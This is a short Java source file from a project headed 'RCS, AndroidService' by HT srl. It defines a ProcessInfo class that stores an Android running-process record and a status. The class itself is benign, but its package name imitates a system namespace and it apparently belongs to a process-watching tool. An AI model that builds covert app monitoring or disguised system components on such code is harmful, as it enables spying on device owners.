/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : ProcessInfo.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.networking;

import android.app.ActivityManager.RunningAppProcessInfo;

import com.android.networking.auto.Cfg;

public class ProcessInfo {
	public RunningAppProcessInfo processInfo;
	public ProcessStatus status;

	public ProcessInfo(RunningAppProcessInfo processInfo, ProcessStatus status) {
		this.processInfo = processInfo;
		this.status = status;
	}
	@Override
	public String toString(){
		if(Cfg.DEBUG){
			return processInfo + " : " + status;
		}else{
			return super.toString();
		}
	}
}
